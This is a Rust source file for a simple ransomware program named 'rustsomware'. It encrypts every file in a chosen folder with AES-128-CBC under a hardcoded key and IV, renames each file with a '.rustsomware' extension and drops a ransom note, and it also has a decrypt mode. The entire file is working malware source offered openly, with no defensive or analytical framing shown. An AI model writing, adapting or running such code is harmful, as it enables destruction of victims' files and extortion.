use std::{
    env,
    fs
};

use libaes::Cipher; 

fn main() {
    let args: Vec<_> = env::args().collect();
    
    if args.len() < 2 {
        println!("Not enough arguments! Usage: rustsomware <encrypt|decrypt> <folder>");
        return;
    }

    let entries = fs::read_dir(args[2].clone()).unwrap();


    // Encrypting / Decrypting every file in the selected directory.
    for raw_entry in entries {
        let entry = raw_entry.unwrap();

        if entry.file_type().unwrap().is_file() {
            if entry.file_name().to_str().unwrap().eq("README_Rustsomware.txt") {
                continue;
            }
            
            if encrypt_decrypt(entry.path().to_str().unwrap(), args[1].as_str()) {
                println!("[+] {} is {}ed!", entry.path().to_str().unwrap(), args[1].as_str());
            }
        }
    }

    // Dropping the README.txt file.
    let ransom_message = include_str!("../res/README.txt");
    let readme_path = format!("{}/README_Rustsomware.txt", args[2].clone());
    fs::write(readme_path, ransom_message).unwrap();
    println!("[+] Dropped ransom message!");
}

fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
    let key = b"fTjWmZq4t7w!z%C*";
    let iv = b"+MbQeThWmZq4t6w9";
    let cipher = Cipher::new_128(key);

    match action {
        "encrypt" => {
            println!("[*] Encrypting {}", file_name);
            let encrypted = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());
            fs::write(file_name, encrypted).unwrap();
            let new_filename = format!("{}.rustsomware", file_name);
            fs::rename(file_name, new_filename).unwrap();
        }

        "decrypt" => {
            println!("[*] Decrypting {}", file_name);
            let decrypted = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());
            fs::write(file_name, decrypted).unwrap();
            let new_filename = file_name.replace(".rustsomware", "");
            fs::rename(file_name, new_filename).unwrap();
        }

        _ => { 
            println!("[-] Invalid action!");
            return false 
        }
    }

    return true;
}